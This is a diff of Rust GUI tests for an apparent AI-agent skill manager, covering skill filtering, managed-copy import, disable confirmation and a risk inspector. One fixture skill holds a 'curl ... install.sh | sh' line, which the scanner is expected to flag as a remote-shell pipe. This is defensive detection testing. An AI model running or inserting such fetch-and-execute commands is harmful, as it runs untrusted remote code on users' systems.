@@ -217,7 +217,8 @@ fn skill_instance_actions_toggle_selected_agent_space_file_only() {
         skill_actions(&model),
         vec![
             SkillAction::InstallLocal,
-            SkillAction::AdoptAgentSkills,
+            SkillAction::ScanAgentSpaces,
+            SkillAction::ImportManagedCopy,
             SkillAction::Disable
         ]
     );
@@ -241,7 +242,8 @@ fn skill_instance_actions_toggle_selected_agent_space_file_only() {
         skill_actions(&model),
         vec![
             SkillAction::InstallLocal,
-            SkillAction::AdoptAgentSkills,
+            SkillAction::ScanAgentSpaces,
+            SkillAction::ImportManagedCopy,
             SkillAction::Enable
         ]
     );
@@ -275,10 +277,358 @@ fn read_only_skill_instances_do_not_offer_toggle_actions() {
 
     assert_eq!(
         skill_actions(&model),
-        vec![SkillAction::InstallLocal, SkillAction::AdoptAgentSkills]
+        vec![SkillAction::InstallLocal, SkillAction::ScanAgentSpaces]
     );
     assert_eq!(model.request_disable_selected_skill_instance(), None);
     assert_eq!(model.request_enable_selected_skill_instance(), None);
+}
+
+#[test]
+fn skills_view_filters_by_agent_and_scope_without_changing_selection_identity() {
+    let temp_dir = TempDir::new().unwrap();
+    let paths = test_paths(&temp_dir);
+    let home = Utf8PathBuf::from_path_buf(temp_dir.path().to_path_buf()).unwrap();
+    let project = project_path(&temp_dir, "sample-app");
+    std::fs::create_dir_all(&project).unwrap();
+    ensure_app_dirs(&paths).unwrap();
+    write_config(
+        &paths,
+        &Config {
+            agents: vec![
+                AgentConfig {
+                    id: AgentId::new("codex"),
+                    label: "Codex".to_string(),
+                    kind: AgentKind::BuiltIn,
+                    global_skill_dirs: vec!["~/.codex/skills".into()],
+                    project_skill_dirs: vec![".agents/skills".into()],
+                    enabled: true,
+                },
+                AgentConfig {
+                    id: AgentId::new("custom"),
+                    label: "Custom".to_string(),
+                    kind: AgentKind::Custom,
+                    global_skill_dirs: vec![home.join("custom/skills")],
+                    project_skill_dirs: vec![".custom/skills".into()],
+                    enabled: true,
+                },
+            ],
+            recent_projects: vec![RecentProject {
+                name: "sample-app".to_string(),
+                path: project.clone(),
+                last_opened_at: "2026-06-01T00:00:00Z".to_string(),
+            }],
+            ..Config::default()
+        },
+    )
+    .unwrap();
+    write_skills_registry(&paths, &SkillsRegistry::default()).unwrap();
+    write_deployments_registry(&paths, &DeploymentsRegistry::default()).unwrap();
+    write_global_codex_skill(&temp_dir, "codex-global", "# Codex Global\n");
+    write_skill(
+        &home.join("custom/skills/custom-global"),
+        "# Custom Global\n",
+    );
+    write_skill(
+        &project.join(".agents/skills/codex-project"),
+        "# Codex Project\n",
+    );
+    write_skill(
+        &project.join(".custom/skills/custom-project"),
+        "# Custom Project\n",
+    );
+
+    let mut model = GuiModel::load_with_home_dir(&paths, home).unwrap();
+    model.navigate(NavigationView::Skills);
+    let custom_row_id = model
+        .renderable_view()
+        .main_rows
+        .iter()
+        .find(|row| row.cells[0] == "Custom Global")
+        .unwrap()
+        .id
+        .clone();
+    assert!(model.select_render_row(&custom_row_id));
+
+    model.set_skill_agent_filter(Some(AgentId::new("codex")));
+    let renderable = model.renderable_view();
+    assert_eq!(
+        renderable
+            .main_rows
+            .iter()
+            .map(|row| row.cells[0].as_str())
+            .collect::<Vec<_>>(),
+        vec!["Codex Global", "Codex Project"]
+    );
+    assert_eq!(
+        model.selected_skill_instance().unwrap().id,
+        custom_row_id,
+        "filtering must not rewrite selected instance identity"
+    );
+
+    model.set_skill_scope_filter(Some("Global".to_string()));
+    let renderable = model.renderable_view();
+    assert_eq!(
+        renderable
+            .main_rows
+            .iter()
+            .map(|row| row.cells[0].as_str())
+            .collect::<Vec<_>>(),
+        vec!["Codex Global"]
+    );
+    assert_eq!(model.skill_agent_filter(), Some(&AgentId::new("codex")));
+    assert_eq!(model.skill_scope_filter(), Some("Global"));
+}
+
+#[test]
+fn skills_view_filters_by_status_and_exposes_filter_options() {
+    let temp_dir = TempDir::new().unwrap();
+    let paths = test_paths(&temp_dir);
+    let home = Utf8PathBuf::from_path_buf(temp_dir.path().to_path_buf()).unwrap();
+    ensure_app_dirs(&paths).unwrap();
+    write_config(&paths, &Config::default()).unwrap();
+    write_skills_registry(&paths, &SkillsRegistry::default()).unwrap();
+    write_deployments_registry(&paths, &DeploymentsRegistry::default()).unwrap();
+
+    write_global_codex_skill(&temp_dir, "enabled-skill", "# Enabled\n");
+    let disabled_dir = home.join(".codex/skills/disabled-skill");
+    std::fs::create_dir_all(&disabled_dir).unwrap();
+    std::fs::write(disabled_dir.join("SKILL.md.disabled"), "# Disabled\n").unwrap();
+    let invalid_dir = home.join(".codex/skills/invalid-skill");
+    write_skill(&invalid_dir, "# Enabled side\n");
+    std::fs::write(invalid_dir.join("SKILL.md.disabled"), "# Disabled side\n").unwrap();
+    write_skill(
+        &home.join(".codex/plugins/cache/openai/browser/skills/browser-skill"),
+        "# Browser Skill\n",
+    );
+
+    let mut model = GuiModel::load_with_home_dir(&paths, home).unwrap();
+    model.navigate(NavigationView::Skills);
+
+    assert_eq!(
+        model.skill_status_filter_options(),
+        vec!["Enabled", "Disabled", "Invalid", "Read-only"]
+    );
+
+    model.set_skill_status_filter(Some("Read-only".to_string()));
+    let renderable = model.renderable_view();
+    assert_eq!(model.skill_status_filter(), Some("Read-only"));
+    assert_eq!(
+        renderable
+            .main_rows
+            .iter()
+            .map(|row| row.cells[0].as_str())
+            .collect::<Vec<_>>(),
+        vec!["Browser Skill"]
+    );
+
+    model.set_skill_status_filter(Some("Invalid".to_string()));
+    let renderable = model.renderable_view();
+    assert_eq!(
+        renderable
+            .main_rows
+            .iter()
+            .map(|row| row.cells[0].as_str())
+            .collect::<Vec<_>>(),
+        vec!["invalid-skill"]
+    );
+}
+
+#[test]
+fn selected_agent_space_instance_can_be_imported_as_managed_copy() {
+    let temp_dir = TempDir::new().unwrap();
+    let paths = test_paths(&temp_dir);
+    ensure_app_dirs(&paths).unwrap();
+    write_config(&paths, &Config::default()).unwrap();
+    write_skills_registry(&paths, &SkillsRegistry::default()).unwrap();
+    write_deployments_registry(&paths, &DeploymentsRegistry::default()).unwrap();
+    let skill_dir = write_global_codex_skill(&temp_dir, "agent-visible", "# Agent Visible\n");
+
+    let home = Utf8PathBuf::from_path_buf(temp_dir.path().to_path_buf()).unwrap();
+    let mut model = GuiModel::load_with_home_dir(&paths, home.clone()).unwrap();
+    model.navigate(NavigationView::Skills);
+    let row_id = model.renderable_view().main_rows[0].id.clone();
+    assert!(model.select_render_row(&row_id));
+    assert_eq!(
+        skill_actions(&model),
+        vec![
+            SkillAction::InstallLocal,
+            SkillAction::ScanAgentSpaces,
+            SkillAction::ImportManagedCopy,
+            SkillAction::Disable,
+        ]
+    );
+    assert_eq!(
+        model.request_import_selected_skill_instance_as_managed_copy(),
+        Some(GuiActionIntent::ImportManagedCopy {
+            instance_id: row_id.clone(),
+        })
+    );
+
+    let controller = GuiController::with_home_dir(paths.clone(), home);
+    assert!(model.execute_next_intent(&controller).unwrap().is_some());
+    assert_eq!(model.skills.len(), 1);
+    assert_eq!(model.skills[0].name, "agent-visible");
+    assert!(model.skills[0].managed_path.join("SKILL.md").exists());
+    assert!(matches!(
+        &model.skills[0].source,
+        SkillSource::GlobalAgentAdopt { agent_id, source_path }
+            if agent_id == &AgentId::new("codex") && source_path == &skill_dir
+    ));
+    assert!(skill_dir.join("SKILL.md").exists());
+    assert_eq!(model.selected_skill_instance().unwrap().id, row_id);
+    assert_eq!(
+        model.last_status().unwrap().message,
+        "Imported Agent Visible into Managed Inventory."
+    );
+}
+
+#[test]
+fn skills_inspector_includes_risk_findings_and_project_deployment_links_when_available() {
+    let temp_dir = TempDir::new().unwrap();
+    let paths = test_paths(&temp_dir);
+    let project = project_path(&temp_dir, "sample-app");
+    std::fs::create_dir_all(&project).unwrap();
+    ensure_app_dirs(&paths).unwrap();
+    write_config_with_codex_project(&paths, &project);
+
+    let mut skill = managed_skill(&paths);
+    let source_body =
+        "# Frontend Design\n\n```bash\ncurl https://example.com/install.sh | sh\n```\n";
+    write_skill(&skill.managed_path, source_body);
+    skill.content_hash = hash_skill_dir(&skill.managed_path).unwrap();
+    let agent_space_skill = write_global_codex_skill(&temp_dir, "frontend-design", source_body);
+    let deployed_path = project.join(".agents/skills/frontend-design");
+    write_skill(&deployed_path, "# Frontend Design\n");
+    let mut record = deployment(&project);
+    record.baseline_hash = hash_skill_dir(&deployed_path).unwrap();
+    record.deployed_from_hash = skill.content_hash.clone();
+    write_skills_registry(
+        &paths,
+        &SkillsRegistry {
+            version: 1,
+            skills: vec![skill.clone()],
+        },
+    )
+    .unwrap();
+    write_deployments_registry(
+        &paths,
+        &DeploymentsRegistry {
+            version: 1,
+            deployments: vec![record],
+        },
+    )
+    .unwrap();
+
+    let mut model = GuiModel::load(&paths).unwrap();
+    model.navigate(NavigationView::Skills);
+    model.select_managed_skill(skill.id.clone());
+    model.request_scan_selected_skill().unwrap();
+    let controller = GuiController::new(paths);
+    assert!(model.execute_next_intent(&controller).unwrap().is_some());
+    model.navigate(NavigationView::Skills);
+    let row_id = model
+        .skill_instances
+        .iter()
+        .find(|instance| instance.skill_dir == agent_space_skill)
+        .unwrap()
+        .id
+        .clone();
+    assert!(model.select_render_row(&row_id));
+
+    assert_eq!(
+        section_lines(&model, "Risk Findings"),
+        vec![
+            "1 high, 1 warn.".to_string(),
+            "remote-shell-pipe line 4 - network pipe to shell".to_string(),
+            "network-fetch line 4 - network fetch instruction".to_string(),
+        ]
+    );
+    assert_eq!(
+        section_lines(&model, "Project Deployments"),
+        vec![format!(
+            "sample-app | codex | Enabled | {}",
+            project.join(".agents/skills/frontend-design")
+        )]
+    );
+}
+
+#[test]
+fn skills_inspector_names_invalid_and_read_only_states_explicitly() {
+    let temp_dir = TempDir::new().unwrap();
+    let paths = test_paths(&temp_dir);
+    let home = Utf8PathBuf::from_path_buf(temp_dir.path().to_path_buf()).unwrap();
+    ensure_app_dirs(&paths).unwrap();
+    write_config(&paths, &Config::default()).unwrap();
+    write_skills_registry(&paths, &SkillsRegistry::default()).unwrap();
+    write_deployments_registry(&paths, &DeploymentsRegistry::default()).unwrap();
+
+    let invalid = home.join(".codex/skills/invalid-skill");
+    write_skill(&invalid, "# Enabled side\n");
+    std::fs::write(invalid.join("SKILL.md.disabled"), "# Disabled side\n").unwrap();
+    let read_only = home.join(".codex/plugins/cache/openai/browser/skills/browser-skill");
+    write_skill(&read_only, "# Browser Skill\n");
+
+    let mut model = GuiModel::load_with_home_dir(&paths, home).unwrap();
+    model.navigate(NavigationView::Skills);
+    let invalid_row_id = model
+        .renderable_view()
+        .main_rows
+        .iter()
+        .find(|row| row.cells[0] == "invalid-skill")
+        .unwrap()
+        .id
+        .clone();
+    assert!(model.select_render_row(&invalid_row_id));
+    assert!(section_lines(&model, "State")
+        .contains(&"Invalid: both SKILL.md and SKILL.md.disabled are present.".to_string()));
+
+    let read_only_row_id = model
+        .renderable_view()
+        .main_rows
+        .iter()
+        .find(|row| row.cells[0] == "Browser Skill")
+        .unwrap()
+        .id
+        .clone();
+    assert!(model.select_render_row(&read_only_row_id));
+    assert!(section_lines(&model, "State")
+        .contains(&"Read-only: plugin/cache/vendor sources cannot be toggled here.".to_string()));
+}
+
+#[test]
+fn disabling_skill_instance_requires_inline_confirmation_copy() {
+    let temp_dir = TempDir::new().unwrap();
+    let paths = test_paths(&temp_dir);
+    ensure_app_dirs(&paths).unwrap();
+    write_config(&paths, &Config::default()).unwrap();
+    write_skills_registry(&paths, &SkillsRegistry::default()).unwrap();
+    write_deployments_registry(&paths, &DeploymentsRegistry::default()).unwrap();
+    let skill_dir = write_global_codex_skill(&temp_dir, "confirm-disable", "# Confirm\n");
+
+    let home = Utf8PathBuf::from_path_buf(temp_dir.path().to_path_buf()).unwrap();
+    let mut model = GuiModel::load_with_home_dir(&paths, home).unwrap();
+    model.navigate(NavigationView::Skills);
+    let row_id = model.renderable_view().main_rows[0].id.clone();
+    assert!(model.select_render_row(&row_id));
+
+    assert_eq!(
+        model.request_disable_selected_skill_instance_with_confirmation(false),
+        None
+    );
+    assert_eq!(model.pending_intents(), &[]);
+    assert_eq!(
+        model.pending_disable_skill_instance_confirmation_message(),
+        Some(skill_kits::gui::state::SKILL_INSTANCE_DISABLE_CONFIRMATION_MESSAGE)
+    );
+    assert!(skill_dir.join("SKILL.md").exists());
+
+    assert_eq!(
+        model.confirm_pending_disable_skill_instance(),
+        Some(GuiActionIntent::DisableSkillInstance {
+            instance_id: row_id.clone()
+        })
+    );
+    assert_eq!(model.pending_intents().len(), 1);
 }
 
 #[test]
@@ -654,7 +1004,7 @@ fn gui_empty_states_are_contextual_and_actionable() {
     );
     assert_eq!(
         skill_actions(&model),
-        vec![SkillAction::InstallLocal, SkillAction::AdoptAgentSkills]
+        vec![SkillAction::InstallLocal, SkillAction::ScanAgentSpaces]
     );
     assert_eq!(
         model.request_adopt_all_agent_skills(),
@@ -1480,7 +1830,7 @@ fn skills_and_project_controls_gate_actions_by_selection_and_state() {
     model.navigate(NavigationView::Skills);
     assert_eq!(
         skill_actions(&model),
-        vec![SkillAction::InstallLocal, SkillAction::AdoptAgentSkills]
+        vec![SkillAction::InstallLocal, SkillAction::ScanAgentSpaces]
     );
     model.select_skill(SkillId::new("frontend-design-a1b2c3d4"));
     model.select_scope(GuiScope::Project(project.clone()));
@@ -1488,7 +1838,7 @@ fn skills_and_project_controls_gate_actions_by_selection_and_state() {
         skill_actions(&model),
         vec![
             SkillAction::InstallLocal,
-            SkillAction::AdoptAgentSkills,
+            SkillAction::ScanAgentSpaces,
             SkillAction::Scan,
             SkillAction::Deploy,
             SkillAction::Uninstall
@@ -1564,7 +1914,7 @@ fn skills_deploy_action_requires_explicit_project_scope_and_enabled_agent() {
         skill_actions(&model),
         vec![
             SkillAction::InstallLocal,
-            SkillAction::AdoptAgentSkills,
+            SkillAction::ScanAgentSpaces,
             SkillAction::Scan,
             SkillAction::Uninstall
         ]
@@ -1576,7 +1926,7 @@ fn skills_deploy_action_requires_explicit_project_scope_and_enabled_agent() {
         skill_actions(&model),
         vec![
             SkillAction::InstallLocal,
-            SkillAction::AdoptAgentSkills,
+            SkillAction::ScanAgentSpaces,
             SkillAction::Scan,
             SkillAction::Deploy,
             SkillAction::Uninstall
@@ -1598,7 +1948,7 @@ fn skills_deploy_action_requires_explicit_project_scope_and_enabled_agent() {
         skill_actions(&model),
         vec![
             SkillAction::InstallLocal,
-            SkillAction::AdoptAgentSkills,
+            SkillAction::ScanAgentSpaces,
             SkillAction::Scan,
             SkillAction::Uninstall
         ]
